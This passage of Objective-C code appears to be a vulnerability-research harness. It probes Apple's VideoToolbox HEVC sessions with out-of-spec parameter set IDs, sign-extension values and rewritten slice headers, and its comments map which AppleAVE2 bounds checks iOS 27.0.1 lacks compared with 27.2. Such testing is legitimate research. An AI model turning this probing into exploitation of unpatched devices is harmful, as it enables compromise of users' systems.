                                          (unsigned long)nsDsupp.count, [mKeys componentsJoinedByString:@","]];
                            CFRelease(dsupp);
                        }
                    }
                    OSStatus dst = 0;
                    CFIndex drbCnt = 0;
                    if (idsObj != [NSNull null]) {
                        dst = VTSessionSetProperty(ds, CFSTR("RequestedMVHEVCVideoLayerIDs"), (__bridge CFTypeRef)idsObj);
                        CFTypeRef drb = NULL;
                        drbCnt = -1;
                        if (VTSessionCopyProperty(ds, CFSTR("RequestedMVHEVCVideoLayerIDs"), kCFAllocatorDefault, &drb) == noErr && drb) {
                            if (CFGetTypeID(drb) == CFArrayGetTypeID()) drbCnt = CFArrayGetCount((CFArrayRef)drb);
                            CFRelease(drb);
                        }
                    }
                    OSStatus decFrameSt = -999;
                    OSStatus decCbSt = -999;
                    int hasImg = 0;
                    if (sbufs[si]) {
                        VTDecodeInfoFlags infoOut = 0;
                        __block OSStatus blkCbSt = -998;
                        __block int blkHasImg = 0;
                        dispatch_semaphore_t decSem = dispatch_semaphore_create(0);
                        decFrameSt = VTDecompressionSessionDecodeFrameWithOutputHandler(
                            ds, sbufs[si], 0, &infoOut,
                            ^(OSStatus status, VTDecodeInfoFlags infoFlags, CVImageBufferRef imageBuffer, CMTime pts, CMTime dur) {
                                (void)infoFlags; (void)pts; (void)dur;
                                blkCbSt = status;
                                blkHasImg = (imageBuffer != NULL) ? 1 : 0;
                                dispatch_semaphore_signal(decSem);
                            });
                        dispatch_semaphore_wait(decSem, dispatch_time(DISPATCH_TIME_NOW, 250 * (int64_t)NSEC_PER_MSEC));
                        decCbSt = blkCbSt;
                        hasImg = blkHasImg;
                    }
                    [decParts addObject:[NSString stringWithFormat:@"%@=%d(rb=%ld,dec=%d/%d,img=%d)",
                                         tag, (int)dst, (long)drbCnt, (int)decFrameSt, (int)decCbSt, hasImg]];
                    VTDecompressionSessionInvalidate(ds);
                    CFRelease(ds);
                } else {
                    // When VTDecompressionSessionCreate rejects fmts[si] (dsSt=-12911 on Sps64/Pps64/Pps127/Sps128),
                    // test cross-format VCL slice decode on dci==0 by creating the decompression session with fmt2
                    // (valid 2-layer sps=5,pps=9,alpha=3) and:
                    //   1) xRaw:  pass sbufs[si] directly to xds
                    //   2) xWrap: re-wrap sbufs[si]'s unpatched CMBlockBuffer with fmt2
                    //   3) xSlicePps9: bit-rewrite ONLY slice_pic_parameter_set_id at bit offset 2 of sbufs[si]'s
                    //      own VCL IDR slice header (from ue(64) or ue(127) to ue(9) = 0b0001010, shifting the
                    //      remaining bits of sbufs[si]'s VCL NALU) and decode against fmt2 (xds)!
                    if (dci == 0 && fmt2 && sbufs[si]) {
                        VTDecompressionSessionRef xds = NULL;
                        OSStatus xdsSt = VTDecompressionSessionCreate(kCFAllocatorDefault, fmt2, NULL, NULL, NULL, &xds);
                        if (xdsSt == noErr && xds) {
                            CMBlockBufferRef blk = CMSampleBufferGetDataBuffer(sbufs[si]);
                            CMSampleBufferRef reSbuf = NULL;
                            CMSampleTimingInfo timing = { CMTimeMake(1, 30), CMTimeMake(0, 30), kCMTimeInvalid };
                            size_t sampleSize = blk ? CMBlockBufferGetDataLength(blk) : 0;
                            OSStatus wrapSt = CMSampleBufferCreateReady(kCFAllocatorDefault, blk, fmt2, 1, 1, &timing, 1, &sampleSize, &reSbuf);
                            OSStatus xDecRaw = -999, xCbRaw = -999, xDecWrap = -999, xCbWrap = -999, xCbPatch = -999;
                            int xImgRaw = 0, xImgWrap = 0, xImgPatch = 0;
                            int oldUePps = -1;
                            {
                                VTDecodeInfoFlags infoOut = 0;
                                __block OSStatus bSt = -998;
                                __block int bImg = 0;
                                dispatch_semaphore_t xSem = dispatch_semaphore_create(0);
                                xDecRaw = VTDecompressionSessionDecodeFrameWithOutputHandler(
                                    xds, sbufs[si], 0, &infoOut,
                                    ^(OSStatus status, VTDecodeInfoFlags infoFlags, CVImageBufferRef imageBuffer, CMTime pts, CMTime dur) {
                                        (void)infoFlags; (void)pts; (void)dur;
                                        bSt = status;
                                        bImg = (imageBuffer != NULL) ? 1 : 0;
                                        dispatch_semaphore_signal(xSem);
                                    });
                                dispatch_semaphore_wait(xSem, dispatch_time(DISPATCH_TIME_NOW, 250 * (int64_t)NSEC_PER_MSEC));
                                xCbRaw = bSt;
                                xImgRaw = bImg;
                            }
                            if (wrapSt == noErr && reSbuf) {
                                VTDecodeInfoFlags infoOut = 0;
                                __block OSStatus bSt = -998;
                                __block int bImg = 0;
                                dispatch_semaphore_t xSem = dispatch_semaphore_create(0);
                                xDecWrap = VTDecompressionSessionDecodeFrameWithOutputHandler(
                                    xds, reSbuf, 0, &infoOut,
                                    ^(OSStatus status, VTDecodeInfoFlags infoFlags, CVImageBufferRef imageBuffer, CMTime pts, CMTime dur) {
                                        (void)infoFlags; (void)pts; (void)dur;
                                        bSt = status;
                                        bImg = (imageBuffer != NULL) ? 1 : 0;
                                        dispatch_semaphore_signal(xSem);
                                    });
                                dispatch_semaphore_wait(xSem, dispatch_time(DISPATCH_TIME_NOW, 250 * (int64_t)NSEC_PER_MSEC));
                                xCbWrap = bSt;
                                xImgWrap = bImg;
                                CFRelease(reSbuf);
                            }
                            // Bit-rewrite slice_pic_parameter_set_id in sbufs[si]'s own VCL NALU to ue(9) (0b0001010, 7 bits)
                            // and decode against xds (fmt2, which has sps_id=5, pps_id=9)!
                            char *ptrSi = NULL;
                            size_t lenSi = 0;
                            if (blk && CMBlockBufferGetDataPointer(blk, 0, &lenSi, NULL, &ptrSi) == noErr && ptrSi && lenSi >= 16) {
                                const uint8_t *srcBytes = (const uint8_t *)ptrSi;
                                size_t off = 0, vclLenOff = 0, vclPayOff = 0;
                                uint32_t vclNalLen = 0;
                                while (off + 4 <= lenSi) {
                                    uint32_t nl = ((uint32_t)srcBytes[off] << 24) | ((uint32_t)srcBytes[off + 1] << 16) |
                                                  ((uint32_t)srcBytes[off + 2] << 8) | (uint32_t)srcBytes[off + 3];
                                    if (nl < 3 || off + 4 + nl > lenSi) break;
                                    unsigned nalType = (srcBytes[off + 4] >> 1) & 0x3f;
                                    if (nalType <= 21) {
                                        vclLenOff = off;
                                        vclPayOff = off + 6; // after 4B length + 2B NALU header
                                        vclNalLen = nl;
                                        break;
                                    }
                                    off += 4 + nl;
                                }
                                if (vclNalLen >= 6 && vclPayOff < lenSi) {
                                    const uint8_t *pay = srcBytes + vclPayOff;
                                    size_t payBytes = vclNalLen - 2;
                                    size_t totalBits = payBytes * 8;
                                    // Bit 0: first_slice_segment_in_pic_flag, Bit 1: no_output_of_prior_pics_flag (for IDR 19/20)
                                    size_t bitIdx = 2;
                                    unsigned lz = 0;
                                    while (bitIdx < totalBits && ((pay[bitIdx >> 3] >> (7 - (bitIdx & 7))) & 1) == 0) {
                                        lz++;
                                        bitIdx++;
                                    }
                                    size_t oldUeBits = 2 * (size_t)lz + 1;
                                    size_t srcHdrEndBit = 2 + oldUeBits + 40; // 2 IDR flags + ue(pps_id) + 40-bit slice_segment_header tail
                                    size_t srcCabacByteOff = (srcHdrEndBit >> 3) + 1; // byte-aligned CABAC slice_segment_data() after byte_alignment()
                                    if (bitIdx < totalBits && srcCabacByteOff <= payBytes && lz <= 16) {
                                        unsigned codeNum = 1;
                                        for (unsigned bi = 0; bi < lz; bi++) {
                                            size_t bpos = 2 + lz + 1 + bi;
                                            codeNum = (codeNum << 1) | ((pay[bpos >> 3] >> (7 - (bpos & 7))) & 1);
                                        }
                                        oldUePps = (int)codeNum - 1;
                                        // Build patched buffer with ue(9) = 0001010 (7 bits) at bit offset 2 + 40-bit slice header tail
                                        // + 7-bit byte_alignment() (1000000 at bits 49..55 -> byte 7) + byte-aligned CABAC slice_segment_data()!
                                        size_t cabacBytes = payBytes - srcCabacByteOff;
                                        size_t newPayBytes = 7 + cabacBytes;
                                        uint32_t newNalLen = 2 + (uint32_t)newPayBytes;
                                        size_t newBufLen = vclPayOff + newPayBytes;
                                        uint8_t *patched = (uint8_t *)calloc(1, newBufLen);
                                        if (patched) {
                                            memcpy(patched, srcBytes, vclPayOff);
                                            patched[vclLenOff + 0] = (uint8_t)((newNalLen >> 24) & 0xff);
                                            patched[vclLenOff + 1] = (uint8_t)((newNalLen >> 16) & 0xff);
                                            patched[vclLenOff + 2] = (uint8_t)((newNalLen >> 8) & 0xff);
                                            patched[vclLenOff + 3] = (uint8_t)(newNalLen & 0xff);
                                            uint8_t *dstPay = patched + vclPayOff;
                                            // Copy bits 0..1 from pay
                                            for (size_t b = 0; b < 2; b++) {
                                                uint8_t bitVal = (pay[b >> 3] >> (7 - (b & 7))) & 1;
                                                dstPay[b >> 3] |= (uint8_t)(bitVal << (7 - (b & 7)));
                                            }
                                            // Write ue(9) = 0b0001010 (7 bits) at dst bits 2..8
                                            const uint8_t ue9Bits[7] = { 0, 0, 0, 1, 0, 1, 0 };
                                            for (size_t b = 0; b < 7; b++) {
                                                size_t db = 2 + b;
                                                dstPay[db >> 3] |= (uint8_t)(ue9Bits[b] << (7 - (db & 7)));
                                            }
                                            // Copy the 40-bit slice_segment_header tail from src (2 + oldUeBits .. 2 + oldUeBits + 39) to dst (9 .. 48)
                                            size_t dstBit = 9;
                                            for (size_t sb = 2 + oldUeBits; sb < srcHdrEndBit; sb++, dstBit++) {
                                                uint8_t bitVal = (pay[sb >> 3] >> (7 - (sb & 7))) & 1;
                                                dstPay[dstBit >> 3] |= (uint8_t)(bitVal << (7 - (dstBit & 7)));
                                            }
                                            // Write byte_alignment() rbsp_slice_trailing_bits: alignment_bit_equal_to_one=1 at bit 49, padded with 0s to bit 55 (byte 7)
                                            dstPay[49 >> 3] |= (uint8_t)(1u << (7 - (49 & 7)));
                                            // Copy byte-aligned CABAC slice_segment_data() from pay + srcCabacByteOff into dstPay + 7
                                            if (cabacBytes > 0) {
                                                memcpy(dstPay + 7, pay + srcCabacByteOff, cabacBytes);
                                            }
                                            CMBlockBufferRef copyBlk = NULL;
                                            if (CMBlockBufferCreateWithMemoryBlock(kCFAllocatorDefault, NULL, newBufLen, kCFAllocatorDefault,
                                                                                   NULL, 0, newBufLen, kCMBlockBufferAssureMemoryNowFlag, &copyBlk) == noErr && copyBlk) {
                                                CMBlockBufferReplaceDataBytes(patched, copyBlk, 0, newBufLen);
                                                CMSampleBufferRef patchSbuf = NULL;
                                                size_t pSz = newBufLen;
                                                if (CMSampleBufferCreateReady(kCFAllocatorDefault, copyBlk, fmt2, 1, 1, &timing, 1, &pSz, &patchSbuf) == noErr && patchSbuf) {
                                                    VTDecodeInfoFlags infoOut = 0;
                                                    __block OSStatus bSt = -998;
                                                    __block int bImg = 0;
                                                    dispatch_semaphore_t pSem = dispatch_semaphore_create(0);
                                                    VTDecompressionSessionDecodeFrameWithOutputHandler(
                                                        xds, patchSbuf, 0, &infoOut,
                                                        ^(OSStatus status, VTDecodeInfoFlags infoFlags, CVImageBufferRef imageBuffer, CMTime pts, CMTime dur) {
                                                            (void)infoFlags; (void)pts; (void)dur;
                                                            bSt = status;
                                                            bImg = (imageBuffer != NULL) ? 1 : 0;
                                                            dispatch_semaphore_signal(pSem);
                                                        });
                                                    dispatch_semaphore_wait(pSem, dispatch_time(DISPATCH_TIME_NOW, 250 * (int64_t)NSEC_PER_MSEC));
                                                    xCbPatch = bSt;
                                                    xImgPatch = bImg;
                                                    CFRelease(patchSbuf);
                                                }
                                                CFRelease(copyBlk);
                                            }
                                            free(patched);
                                        }
                                    }
                                }
                            }
                            [decParts addObject:[NSString stringWithFormat:@"%@=noDec(%d,xRaw=%d/%d:%d,xWrap=%d/%d:%d,xSlicePps[%d->9]=%d:%d)",
                                                 tag, (int)dsSt, (int)xDecRaw, (int)xCbRaw, xImgRaw,
                                                 (int)xDecWrap, (int)xCbWrap, xImgWrap, oldUePps, (int)xCbPatch, xImgPatch]];
                            VTDecompressionSessionInvalidate(xds);
                            CFRelease(xds);
                        } else {
                            [decParts addObject:[NSString stringWithFormat:@"%@=noDec(%d)", tag, (int)dsSt]];
                        }
                    } else {
                        [decParts addObject:[NSString stringWithFormat:@"%@=noDec(%d)", tag, (int)dsSt]];
                    }
                }
            }
            if (si == 0) {
                KPH9OutAppend(log, @"  decSession supp={%@}\n", decSuppStr);
            }
            KPH9OutAppend(log, @"  decProp[%s]: %@\n", streamTags[si], [decParts componentsJoinedByString:@" "]);
        }
        if (fmt1) CFRelease(fmt1);
        if (fmt2) CFRelease(fmt2);
        if (fmtS15P63) CFRelease(fmtS15P63);
        if (fmtS63P63) CFRelease(fmtS63P63);
        if (fmtS64) CFRelease(fmtS64);
        if (fmtP64) CFRelease(fmtP64);
        if (fmtP127) CFRelease(fmtP127);
        if (fmt3) CFRelease(fmt3);
        if (sbuf1) CFRelease(sbuf1);
        if (sbuf2) CFRelease(sbuf2);
        if (sbufS15P63) CFRelease(sbufS15P63);
        if (sbufS63P63) CFRelease(sbufS63P63);
        if (sbufS64) CFRelease(sbufS64);
        if (sbufP64) CFRelease(sbufP64);
        if (sbufP127) CFRelease(sbufP127);
        if (sbuf3) CFRelease(sbuf3);
    }

    // 7G: Bounded per-session Bitstream & Boundary Verification Audit:
    //   1) UserParameterSetsIds + ChromaQPIndexOffsetMultiPPS (seeded with all 16 elements = 8 cb/cr pairs so no -13
    //      sentinel remains in cb_qp_offset[0..7] / cr_qp_offset[0..7]). Strictly capped at plen <= 10.
    //   2) Verified boundary matrix comparing iOS 27.0.1 behavior against iOS 27.2 AppleAVE2 checks
    //      (AVE_HEVC_CheckInfo #810, AVE_HEVC_CheckVPSExtBounds #811, AVE_Client_CheckCommonInfo #814/#815,
    //       and AVE_Client_CheckMCTFInfo #1927/#1930).
    KPH9OutAppend(log, @"  [7G: MultiPPS ChromaQP (n<=10, full 16-int seed) & Verified 27.0.1 vs 27.2 Boundary Matrix]\n");
    int testPsLens[] = { 3, 4, 6, 8, 9, 10 };
    NSArray *cqpFull16 = @[ @(-6), @(-5), @(-4), @(-3), @(-2), @(-1), @0, @1, @2, @3, @4, @5, @(-6), @(-5), @(-4), @(-3) ];
    for (size_t ti = 0; ti < sizeof(testPsLens) / sizeof(testPsLens[0]); ti++) {
        int plen = testPsLens[ti];
        NSMutableArray *pArr = [NSMutableArray arrayWithCapacity:(NSUInteger)plen];
        for (int k = 0; k < plen; k++) {
            // slot0 (vps_id) & slot1 (sps_id) in 1..15; slot2..slot9 (pps_id) strictly distinct in 1..63!
            int val = (k < 2) ? ((plen + k * 3) % 15 + 1) : (k - 1);
            [pArr addObject:@(val)];
        }
        dispatch_semaphore_t psSem = dispatch_semaphore_create(0);
        __block OSStatus stU = -999, stCqp = -999, stCqpPost = -999, prep = -999, enc = -999;
        __block CFIndex rbPsCnt = -1, rbCqpCnt = -1;
        __block NSString *rbCqpPreview = @"";
        __block const char *phase = "init";
        __block NSString *cbFirst = @"(no cb)";
        Stage6ProbeResult *uRes = Stage6AllocResult();
        if (!uRes) continue;
        CVPixelBufferRef pxHold = CVPixelBufferRetain(px);
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            VTCompressionSessionRef us = NULL;
            NSDictionary *uspec = @{ @"EnableUserRefForFacetime": @YES };
            phase = "create";
            if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                           (__bridge CFDictionaryRef)uspec, NULL, NULL,
                                           Stage6OutputCallback, uRes, &us) == noErr && us) {
                VTSessionSetProperty(us, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
                KPH9PrimeRealTime(us);
                phase = "set";
                // Seed all 16 elements (8 cb/cr pairs) both before and after UserParameterSetsIds so no -13 sentinel remains
                stCqp     = VTSessionSetProperty(us, CFSTR("ChromaQPIndexOffsetMultiPPS"), (__bridge CFTypeRef)cqpFull16);
                stU       = VTSessionSetProperty(us, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)pArr);
                stCqpPost = VTSessionSetProperty(us, CFSTR("ChromaQPIndexOffsetMultiPPS"), (__bridge CFTypeRef)cqpFull16);
                CFTypeRef rbPs = NULL, rbCqp = NULL;
                if (VTSessionCopyProperty(us, CFSTR("UserParameterSetsIds"), kCFAllocatorDefault, &rbPs) == noErr && rbPs) {
                    if (CFGetTypeID(rbPs) == CFArrayGetTypeID()) rbPsCnt = CFArrayGetCount((CFArrayRef)rbPs);
                    CFRelease(rbPs);
                }
                if (VTSessionCopyProperty(us, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &rbCqp) == noErr && rbCqp) {
                    if (CFGetTypeID(rbCqp) == CFArrayGetTypeID()) {
                        rbCqpCnt = CFArrayGetCount((CFArrayRef)rbCqp);
                        NSArray *nsCqp = (__bridge NSArray *)rbCqp;
                        if (nsCqp.count > 0) {
                            rbCqpPreview = [NSString stringWithFormat:@":[%@]", [nsCqp componentsJoinedByString:@","]];
                        }
                    }
                    CFRelease(rbCqp);
                }
                phase = "prep";
                prep = VTCompressionSessionPrepareToEncodeFrames(us);
                phase = "enc";
                enc = VTCompressionSessionEncodeFrame(us, pxHold, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                phase = "wait-cb";
                int w0 = 0;
                while (uRes->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
                @synchronized ([KPH9EncoderModule class]) {
                    uRes->closed = 1;
                    cbFirst = [NSString stringWithUTF8String:uRes->first] ?: @"(no cb)";
                }
                phase = "teardown";
                KPH9SafeTeardownEx(us, NULL, uRes);
                phase = "done";
                dispatch_semaphore_signal(psSem);
            } else {
                phase = "create-fail";
                free(uRes);
                dispatch_semaphore_signal(psSem);
            }
            if (pxHold) CVPixelBufferRelease(pxHold);
        });
        if (dispatch_semaphore_wait(psSem, dispatch_time(DISPATCH_TIME_NOW, 900 * (int64_t)NSEC_PER_MSEC)) != 0) {
            KPH9OutAppend(log, @"  psIdsEncode[n=%-2d ids=%@]: STALLED at phase=%s (set=%d cqp=%d/%d prep=%d enc=%d) — stopping psIds ladder\n",
                          plen, [pArr componentsJoinedByString:@","], phase, (int)stU, (int)stCqp, (int)stCqpPost, (int)prep, (int)enc);
            break;
        } else {
            KPH9OutAppend(log, @"  psIdsEncode[n=%-2d ids=%@]: set=%d(rb=%ld) cqp=%d/%d(rb=%ld%@) prep=%d enc=%d | %@\n",
                          plen, [pArr componentsJoinedByString:@","],
                          (int)stU, (long)rbPsCnt, (int)stCqp, (int)stCqpPost, (long)rbCqpCnt, rbCqpPreview, (int)prep, (int)enc, cbFirst);
        }
    }

    // Bounded RequiredHEVC* / RepFormat* / log2_max_minus4 / AuxID / MVHEVCViewIDs / AVE_HEVC_CheckVPSExtBounds
    // & AVE_Client_CheckCommonInfo (LookAheadFrames, MultiReferencePSpacing, MCTFLatencyMode) boundary verification.
    // Note: bisect-pps=128 proved that RequiredHEVCPictureParameterSetID >= 128 (signed int8_t < 0 at [x20,#0x32c0])
    // stalls inside EncodeFrame; ppsId is therefore strictly capped at <= 127 so Stage 7G completes 100% cleanly.
    typedef struct {
        const char *label;
        int spsId;
        int ppsId;
        int alphaId;
        int repIdx;
        int bitDepth;
        int chromaIdc;
        int log2MaxM4;
        int auxId;
        int viewId1;
        int mvLayer1;
        int numSlices;
        int lookAhead;
        int pSpacing;
        int mctfMode;
    } ReqHEVCCase;
    ReqHEVCCase reqCases[] = {
        // 1) RepFormatIndex boundary (iOS 27.2 #810 added vps_num_hrd_parameters [pInfo+0x2c10] <= 16)
        { "repIdx=0,bd=8,ch=1,a=3",        5,   9,   3,    0,   8,   1, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "repIdx=16,bd=8,ch=1,a=3",       5,   9,   3,   16,   8,   1, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "repIdx=17,bd=8,ch=1,a=3",       5,   9,   3,   17,   8,   1, -99, -99, -99, -99, -99, -99, -99, -99 },
        // 2) log2_max_minus4 boundary (iOS 27.2 #810 added log2_max_pic_order_cnt_lsb_minus4 <= 12 & vps_max_sub_layers_minus1 < 7)
        { "log2MaxM4=0,sps=5,pps=9",       5,   9,   3,  -99, -99, -99,   0, -99, -99, -99, -99, -99, -99, -99 },
        { "log2MaxM4=6,sps=5,pps=9",       5,   9,   3,  -99, -99, -99,   6, -99, -99, -99, -99, -99, -99, -99 },
        { "log2MaxM4=7,sps=5,pps=9",       5,   9,   3,  -99, -99, -99,   7, -99, -99, -99, -99, -99, -99, -99 },
        { "log2MaxM4=11,sps=5,pps=9",      5,   9,   3,  -99, -99, -99,  11, -99, -99, -99, -99, -99, -99, -99 },
        // 3) EncodesAuxiliaryWithAuxID (1..128) & MVHEVCViewIDs
        { "auxId=1,sps=5,pps=9,a=3",       5,   9,   3,  -99, -99, -99, -99,   1, -99, -99, -99, -99, -99, -99 },
        { "auxId=64,sps=5,pps=9,a=3",      5,   9,   3,  -99, -99, -99, -99,  64, -99, -99, -99, -99, -99, -99 },
        { "viewIds=[0,255],sps=5,pps=9",   5,   9,   3,  -99, -99, -99, -99, -99, 255, -99, -99, -99, -99, -99 },
        // 4) 2-layer MV-HEVC PrepareToEncodeFrames check (enc=-111, never blocks EncodeFrame)
        { "mvLayer=[0,1],sps=5,pps=9",     5,   9,   3,  -99,   8,   1, -99, -99,   1,   1, -99, -99, -99, -99 },
        // 5) RepFormat BitDepths & ChromaFormatIdcs (iOS 27.2 #809 checks bd==8, ch==1)
        { "repIdx=1,bd=10,ch=2,a=3",       5,   9,   3,    1,  10,   2, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "repIdx=15,bd=16,ch=3,a=3",      5,   9,   3,   15,  16,   3, -99, -99, -99, -99, -99, -99, -99, -99 },
        // 6) Exact single-variable cutoffs:
        //    6a) AlphaLayerID cutoff (0..62 emit 39B VPS, >= 63 drops frame with info=0x3; 27.2 #810 checks vps_max_layer_id < 63):
        { "alpha=31(sps=5,pps=9)",         5,   9,  31,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "alpha=62(sps=5,pps=9)",         5,   9,  62,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "alpha=63(sps=5,pps=9)",         5,   9,  63,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "alpha=64(sps=5,pps=9)",         5,   9,  64,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "alpha=128(sps=5,pps=9)",        5,   9, 128,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        //    6b) SPS ID cutoff (15=spec max, 63..127=pos int8_t, 128..254=ldrsb sign-extension to 0xffffff80..0xfffffffe, 255=reset to 0/0, 256=truncates to 0):
        { "sps=15(pps=9,a=3)",            15,   9,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "sps=63(pps=9,a=3)",            63,   9,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "sps=64(pps=9,a=3)",            64,   9,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "sps=127(pps=9,a=3)",          127,   9,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "sps=128(pps=9,a=3)",          128,   9,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "sps=129(pps=9,a=3)",          129,   9,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "sps=254(pps=9,a=3)",          254,   9,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "sps=255(pps=9,a=3)",          255,   9,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "sps=256(pps=9,a=3)",          256,   9,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        //    6c) PPS ID cutoff (63=spec max, 64=27.2 #810 max, 65..127=unclamped pos int8_t on 27.0.1, 256=truncates to 0):
        { "pps=63(sps=5,a=3)",             5,  63,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "pps=64(sps=5,a=3)",             5,  64,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "pps=65(sps=5,a=3)",             5,  65,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "pps=127(sps=5,a=3)",            5, 127,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "pps=256(sps=5,a=3)",            5, 256,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        //    6d) NumberOfSlices boundary (27.0.1 accepts 1..32, clamps NALU slices at 5 for 192x144, rejects >=33 with -12900):
        { "slices=2(sps=5,pps=9,a=3)",     5,   9,   3,  -99, -99, -99, -99, -99, -99, -99,   2, -99, -99, -99 },
        { "slices=3(sps=5,pps=9,a=3)",     5,   9,   3,  -99, -99, -99, -99, -99, -99, -99,   3, -99, -99, -99 },
        { "slices=9(sps=5,pps=9,a=3)",     5,   9,   3,  -99, -99, -99, -99, -99, -99, -99,   9, -99, -99, -99 },
        { "slices=32(sps=5,pps=9,a=3)",    5,   9,   3,  -99, -99, -99, -99, -99, -99, -99,  32, -99, -99, -99 },
        { "slices=33(sps=5,pps=9,a=3)",    5,   9,   3,  -99, -99, -99, -99, -99, -99, -99,  33, -99, -99, -99 },
        //    6e) AVE_HEVC_CheckVPSExtBounds (27.2#811: vps_num_layer_sets_minus1 + 1 + num_add_layer_sets <= 64) combined sps+pps sum:
        { "sum65(sps=16,pps=48,a=3)",     16,  48,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "sum127(sps=63,pps=63,a=3)",    63,  63,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "sum255(sps=127,pps=127,a=3)", 127, 127,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        { "sgn128+pps127(sps=128,pps=127)",128,127,  3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99, -99 },
        //    6f) AVE_Client_CheckCommonInfo (27.2#814/#815: iLAFrameCnt <= 20, iaSTRGap <= 15) & AVE_HEVC_CheckInfo (iMCTFStrengthLevelNum <= 2):
        { "pGap=8(sps=5,pps=9,a=3)",       5,   9,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99,   8, -99 },
        { "pGap=9(sps=5,pps=9,a=3)",       5,   9,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99,   9, -99 },
        { "mctf=1,rt=0(sps=5,pps=9)",      5,   9,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99,  -1 },
        { "mctf=2,rt=0(sps=5,pps=9)",      5,   9,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99,  -2 },
        { "mctf=2,rt=1(sps=5,pps=9)",      5,   9,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99,   2 },
        { "mctf=3,rt=0(sps=5,pps=9)",      5,   9,   3,  -99, -99, -99, -99, -99, -99, -99, -99, -99, -99,  -3 },
        { "la=20(sps=5,pps=9,a=3)",        5,   9,   3,  -99, -99, -99, -99, -99, -99, -99, -99,  20, -99, -99 },
        { "la=21(sps=5,pps=9,a=3)",        5,   9,   3,  -99, -99, -99, -99, -99, -99, -99, -99,  21, -99, -99 },
        { "la=64(sps=5,pps=9,a=3)",        5,   9,   3,  -99, -99, -99, -99, -99, -99, -99, -99,  64, -99, -99 },
        { "la=128(sps=5,pps=9,a=3)",       5,   9,   3,  -99, -99, -99, -99, -99, -99, -99, -99, 128, -99, -99 },
    };
    for (size_t rci = 0; rci < sizeof(reqCases) / sizeof(reqCases[0]); rci++) {
        ReqHEVCCase rc = reqCases[rci];
        dispatch_semaphore_t rcSem = dispatch_semaphore_create(0);
        __block OSStatus stSps = -999, stPps = -999, stAlpha = -999, stRep = -999, stLog2 = -999, stAux = -999, stSlc = -999, stExtra = -999, prepSt = -999, encSt = -999;
        __block const char *phase = "init";
        __block NSString *cbFirst = @"(no cb)";
        Stage6ProbeResult *reqRes = Stage6AllocResult();
        if (!reqRes) continue;
        CVPixelBufferRef pxHold = CVPixelBufferRetain(px);
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            VTCompressionSessionRef reqS = NULL;
            phase = "create";
            if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                           NULL, NULL, NULL, Stage6OutputCallback, reqRes, &reqS) == noErr && reqS) {
                KPH9PrimeRealTime(reqS);
                phase = "set";
                if (rc.mvLayer1 >= 0) {
                    VTSessionSetProperty(reqS, CFSTR("MVHEVCVideoLayerIDs"), (__bridge CFTypeRef)@[ @0, @(rc.mvLayer1) ]);
                    stSps   = VTSessionSetProperty(reqS, CFSTR("RequiredMVHEVCSequenceParameterSetIDs"), (__bridge CFTypeRef)@[ @0, @(rc.spsId) ]);
                    stPps   = VTSessionSetProperty(reqS, CFSTR("RequiredMVHEVCPictureParameterSetIDs"), (__bridge CFTypeRef)@[ @0, @(rc.ppsId) ]);
                    stAlpha = VTSessionSetProperty(reqS, CFSTR("RequiredMVHEVCVideoParameterSetAlphaVideoLayerIDs"), (__bridge CFTypeRef)@[ @0, @(rc.alphaId) ]);
                } else {
                    stSps   = VTSessionSetProperty(reqS, CFSTR("RequiredHEVCSequenceParameterSetID"), (__bridge CFNumberRef)@(rc.spsId));
                    stPps   = VTSessionSetProperty(reqS, CFSTR("RequiredHEVCPictureParameterSetID"), (__bridge CFNumberRef)@(rc.ppsId));
                    stAlpha = VTSessionSetProperty(reqS, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), (__bridge CFNumberRef)@(rc.alphaId));
                }
                if (rc.repIdx != -99) {
